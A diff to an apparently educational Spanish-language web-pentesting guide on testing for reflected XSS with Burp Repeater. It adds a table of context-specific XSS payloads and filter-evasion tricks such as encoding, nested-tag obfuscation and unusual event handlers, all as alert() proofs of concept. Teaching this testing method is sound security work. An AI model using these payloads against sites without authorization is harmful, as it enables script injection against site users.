@@ -75,30 +75,79 @@ Una vez identificado que el valor fue reflejado, es clave analizar **dónde** y 
 
 ### 4. 🚀 Pruebe una carga útil candidata
 
-Enviá una carga útil simple que ejecute JavaScript si no es filtrada.
+Esta carga útil simple intenta ejecutar JavaScript en el navegador. Si ves un `alert()` con el dominio, ¡tenés un XSS reflejado!
 
-🎯 **Payload recomendada**:
+#### 🧪 Usá Burp Repeater para probar la carga útil
+
+1. Enviá la solicitud original con el valor alfanumérico (ej. `abc123xy`) al **Burp Repeater**.
+2. Sustituí ese valor por una carga útil XSS candidata, por ejemplo:
+
 ```html
 <script>alert(document.domain)</script>
 ```
-### 🧪 Usá Burp Repeater para probar una carga útil candidata
 
-1. **Enviá la solicitud** original con el valor alfanumérico aleatorio (por ejemplo, `abc123xy`) al Burp Repeater.
-2. **Sustituí ese valor** por una **carga útil XSS candidata**, como:
-   ```html
-   <script>alert(document.domain)</script>
-   ```
-3. **Dejá el valor original** junto con el payload, si querés mantener una referencia. Por ejemplo:
-   ```text
-   abc123xy<script>alert(document.domain)</script>
-   ```
-4. **Usá el valor alfanumérico como término de búsqueda (grep)** en la vista de respuesta de **Burp Repeater**.
+3. Podés mantener el valor original junto con el payload, para facilitar el grep:
 
-- Esto permite **resaltar rápidamente** todos los lugares donde se refleja tu entrada.
+```text
+abc123xy<script>alert(document.domain)</script>
+```
 
-5. **Revisá el contexto** donde aparece reflejado en la respuesta HTML para determinar si puede ejecutarse como JavaScript.
+4. En la pestaña de respuesta de Burp, usá el valor `abc123xy` como término de búsqueda (grep) para detectar en qué partes del HTML aparece reflejado.
+5. Revisá el contexto en que aparece para ver si permite ejecución de código.
 
-🧠 **Tip**: Al entender el contexto, podés elegir o ajustar la carga útil adecuada para lograr la ejecución del script.
+> 🧠 **Tip:** El contexto te ayuda a elegir una mejor carga útil. Si estás en un atributo HTML, por ejemplo, vas a necesitar cerrar comillas o inyectar en un evento.
+
+---
+
+### 4.1 🧩 Payloads según contexto
+
+Cada tipo de contexto tiene sus particularidades. Acá tenés una guía para adaptar tu carga útil según cómo se refleje la entrada:
+
+| 🧱 Contexto | 🔍 Reflejo típico | 💥 Payload base | 🧠 Tip |
+|----------|-----------------------|--------------------------|-----------------------------------|
+| HTML plano | `<p>abc123xy</p>` | `<script>alert(1)</script>` | Ideal para empezar |
+| Atributo HTML (comillas) | `<img src="abc123xy">` | `" onerror="alert(1)` | Cerrá comillas y agregá evento |
+| Atributo HTML (sin comillas) | `<img src=abc123xy>` | `onerror=alert(1)` | Sin necesidad de cerrar |
+| Evento inline JS | `<button onclick="doSomething('abc123xy')">` | `');alert(1);//` | Cerrá comillas y paréntesis |
+| Dentro de `<script>` | `<script>var user = 'abc123xy';</script>` | `';alert(1);//` | Cerrá string y ejecutá |
+| URL (href) | `<a href="abc123xy">` | `javascript:alert(1)` | Útil si el enlace se sigue |
+| URL en JS | `window.location = "abc123xy";` | `";alert(1);//` | Inyección directa |
+| JSON en script | `let data = {"name":"abc123xy"}` | `"abc123xy"};alert(1);//` | Cerrá objeto y ejecutá |
+
+---
+
+### 🎩 Técnicas de evasión útiles
+
+Si la carga útil es filtrada, probá con:
+
+#### 🔐 Codificación:
+
+```html
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+#### 🌀 Obfuscación de etiquetas:
+
+```html
+<scr<script>ipt>alert(1)</scr</script>ipt>
+```
+
+#### 🎮 Eventos menos comunes:
+
+```html
+<video><source onerror="alert(1)">
+<details open ontoggle="alert(1)">
+```
+
+---
+
+### 🧠 Tips
+
+- Probá distintas combinaciones de **comillas**, **etiquetas**, **eventos** y **codificaciones**.
+- **Grepeá tu valor de prueba** (`abc123xy`) para identificar cómo se refleja.
+- Analizá el **HTML resultante en DevTools (F12)** para confirmar cómo se ve realmente la inyección.
+
+
 
 ### 5. 🧨 Pruebe cargas útiles alternativas
 
